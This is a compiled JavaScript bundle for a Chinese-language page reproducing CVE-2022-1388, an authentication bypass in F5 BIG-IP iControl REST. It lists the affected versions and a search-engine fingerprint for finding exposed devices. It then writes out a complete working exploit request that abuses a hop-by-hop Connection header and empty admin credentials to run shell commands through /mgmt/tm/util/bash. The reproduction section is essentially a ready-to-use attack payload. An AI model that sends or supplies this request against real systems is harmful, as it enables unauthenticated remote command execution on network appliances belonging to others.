(window.webpackJsonp=window.webpackJsonp||[]).push([[507],{2182:function(s,a,t){s.exports=t.p+"assets/img/image-20220509184545493.7477b886.png"},2183:function(s,a,t){s.exports=t.p+"assets/img/1652093045231-d532fbbd-7b56-4f58-a7a6-75d317750ad1.569071f8.png"},3363:function(s,a,t){"use strict";t.r(a);var r=t(63),n=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"f5-big-ip-icontrol-rest身份认证绕过漏洞-cve-2022-1388"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#f5-big-ip-icontrol-rest身份认证绕过漏洞-cve-2022-1388"}},[s._v("#")]),s._v(" F5 BIG-IP iControl REST身份认证绕过漏洞 CVE-2022-1388")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("BIG-IP 是 F5 公司的一款应用交付服务是面向以应用为中心的世界先进技术。借助 BIG-IP 应用程序交付控制器保持应用程序正常运行。BIG-IP 本地流量管理器 (LTM) 和 BIG-IP DNS 能够处理应用程序流量并保护基础设施。未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("11.6.1-16.1.2")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('icon_hash="-335242539"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登录页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(2182),alt:"image-20220509184545493"}})]),s._v(" "),a("p",[s._v("发送请求包(Host设为localhost)")]),s._v(" "),a("div",{staticClass:"language-java line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-java"}},[a("code",[a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("mgmt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("tm"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("util"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("bash "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Host")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" localhost\n"),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Authorization")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Basic")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("YWRtaW46")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("X")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("F5")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Auth")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Token")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" a\n"),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Connection")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" close"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("X")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("F5")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Auth")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Token")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Content")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("Length")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("39")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"command"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"run"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"utilCmdArgs"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"-c id"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2183),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);